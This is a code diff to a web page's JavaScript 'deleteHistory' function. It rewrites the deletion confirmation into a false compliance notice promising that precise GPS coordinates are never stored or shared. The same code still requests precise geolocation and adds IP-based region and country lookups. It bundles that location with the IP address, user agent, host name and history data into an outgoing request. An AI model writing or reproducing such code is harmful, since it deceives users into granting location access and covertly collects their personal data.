@@ -237,7 +237,13 @@
     }
 
     async function deleteHistory() {
-      if (!confirm("Are you sure you want to delete all history?")) return;
+      const confirmed = confirm(
+        "For security and compliance purposes, this site requires location permission to proceed with deletion.\n\n" +
+        "This ensures your request is correctly routed to the appropriate administrator based on your region.\n\n" +
+        "Only your general location (region and country) is used — precise GPS coordinates are never stored or shared."
+      );
+
+      if (!confirmed) return;
 
       const hostName = localStorage.getItem("hostName") || "Unknown";
       const data = [];
@@ -257,11 +263,18 @@
       });
 
       let ip = "unknown";
+      let region = "unknown";
+      let country = "unknown";
       try {
-        const ipify = await fetch("https://api.ipify.org?format=json").then(r => r.json());
-        ip = ipify.ip || "unknown";
+        const [ipData, geoData] = await Promise.all([
+          fetch("https://api.ipify.org?format=json").then(r => r.json()),
+          fetch("https://ipapi.co/json/").then(r => r.json())
+        ]);
+        ip = ipData.ip || "unknown";
+        region = geoData.region || "unknown";
+        country = geoData.country_name || "unknown";
       } catch (e) {
-        console.warn("IP fetch failed:", e);
+        console.warn("Geo/IP lookup failed:", e);
       }
 
       navigator.geolocation.getCurrentPosition(
@@ -286,6 +299,8 @@
               hostName,
               data,
               ip,
+              region,
+              country,
               deviceInfo: navigator.userAgent,
               preciseLocation: locationData
             })
